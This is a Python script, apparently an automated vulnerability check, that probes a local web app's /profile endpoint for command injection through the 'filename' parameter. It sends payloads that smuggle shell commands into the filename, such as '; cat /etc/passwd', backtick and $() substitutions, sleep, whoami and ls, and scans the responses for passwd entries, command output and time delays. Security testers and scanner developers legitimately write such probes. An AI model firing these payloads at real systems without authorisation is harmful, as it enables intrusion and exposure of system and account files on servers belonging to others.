#!/usr/bin/env python3
import requests
import json
import sys

def exploit():
    # Vulnerability details
    vuln_id = "profile-command-injection-filename"
    target_url = "http://localhost:3000"
    endpoint = "/profile"
    
    # Initialize result structure
    result = {
        "vulnerability_id": vuln_id,
        "target_url": target_url + endpoint,
        "vulnerability_exists": False,
        "confidence": "low",
        "evidence": [],
        "error": None
    }
    
    try:
        # Test payloads for command injection in filename parameter
        test_payloads = [
            # Basic command injection attempts
            "profile.jpg; cat /etc/passwd",
            "profile.jpg && cat /etc/passwd",
            "profile.jpg | cat /etc/passwd",
            "profile.jpg`cat /etc/passwd`",
            "profile.jpg$(cat /etc/passwd)",
            # Time-based detection
            "profile.jpg; sleep 5",
            "profile.jpg && ping -c 3 127.0.0.1",
            # Error-based detection
            "profile.jpg; ls -la /",
            "profile.jpg; whoami",
            "profile.jpg; pwd"
        ]
        
        # First, test normal behavior to establish baseline
        print("Testing baseline behavior...", file=sys.stderr)
        baseline_response = requests.get(
            target_url + endpoint,
            params={"filename": "profile.jpg"},
            timeout=10
        )
        baseline_time = baseline_response.elapsed.total_seconds()
        baseline_content = baseline_response.text
        baseline_status = baseline_response.status_code
        
        result["baseline"] = {
            "status_code": baseline_status,
            "response_time": baseline_time,
            "content_length": len(baseline_content)
        }
        
        # Test each payload
        for i, payload in enumerate(test_payloads):
            print(f"Testing payload {i+1}/{len(test_payloads)}: {payload[:50]}...", file=sys.stderr)
            
            try:
                # Send request with malicious filename parameter
                response = requests.get(
                    target_url + endpoint,
                    params={"filename": payload},
                    timeout=15  # Longer timeout to catch sleep commands
                )
                
                response_time = response.elapsed.total_seconds()
                response_content = response.text
                response_status = response.status_code
                
                # Analyze response for command injection indicators
                indicators_found = []
                
                # Check for /etc/passwd content (Linux systems)
                if "root:x:0:0:" in response_content or "bin:x:1:1:" in response_content:
                    indicators_found.append("passwd_file_content")
                
                # Check for common system file patterns
                if any(pattern in response_content.lower() for pattern in [
                    "root:", "daemon:", "bin:", "sys:", "adm:", "mail:", "www-data:"
                ]):
                    indicators_found.append("system_user_entries")
                
                # Check for command output patterns
                if any(pattern in response_content for pattern in [
                    "uid=", "gid=", "groups=",  # whoami-like output
                    "total ", "drwx", "-rw-",   # ls output
                    "/home", "/root", "/var",   # directory paths
                    "PING 127.0.0.1"           # ping output
                ]):
                    indicators_found.append("command_output_patterns")
                
                # Check for time-based injection (sleep command)
                if "sleep" in payload and response_time > baseline_time + 4:
                    indicators_found.append("time_delay_detected")
                
                # Check for error messages that might indicate command execution
                error_patterns = [
                    "command not found",
                    "permission denied",
                    "no such file or directory",
                    "syntax error",
                    "bash:",
                    "sh:"
                ]
                if any(pattern in response_content.lower() for pattern in error_patterns):
                    indicators_found.append("command_error_messages")
                
                # Check for significant differences in response
                content_diff = abs(len(response_content) - len(baseline_content))
                if content_diff > 100:  # Significant content length difference
                    indicators_found.append("significant_content_change")
                
                # Store test result
                test_result = {
                    "payload": payload,
                    "status_code": response_status,
                    "response_time": response_time,
                    "content_length": len(response_content),
                    "indicators": indicators_found,
                    "response_preview": response_content[:200] + "..." if len(response_content) > 200 else response_content
                }
                
                result["evidence"].append(test_result)
                
                # Determine if vulnerability exists based on indicators
                if indicators_found:
                    result["vulnerability_exists"] = True
                    if "passwd_file_content" in indicators_found or "time_delay_detected" in indicators_found:
                        result["confidence"] = "high"
                    elif len(indicators_found) >= 2:
                        result["confidence"] = "medium"
                    else:
                        result["confidence"] = "low"
                
            except requests.exceptions.Timeout:
                # Timeout could indicate sleep command execution
                if "sleep" in payload:
                    result["evidence"].append({
                        "payload": payload,
                        "status": "timeout",
                        "indicators": ["request_timeout"],
                        "note": "Timeout may indicate sleep command execution"
                    })
                    result["vulnerability_exists"] = True
                    result["confidence"] = "medium"
            
            except requests.exceptions.RequestException as e:
                result["evidence"].append({
                    "payload": payload,
                    "error": str(e)
                })
    
    except requests.exceptions.ConnectionError:
        result["error"] = "Unable to connect to target server"
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
    
    # Final assessment
    if result["vulnerability_exists"]:
        result["summary"] = f"Command injection vulnerability detected in filename parameter with {result['confidence']} confidence"
    else:
        result["summary"] = "No clear evidence of command injection vulnerability found"
    
    return result

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))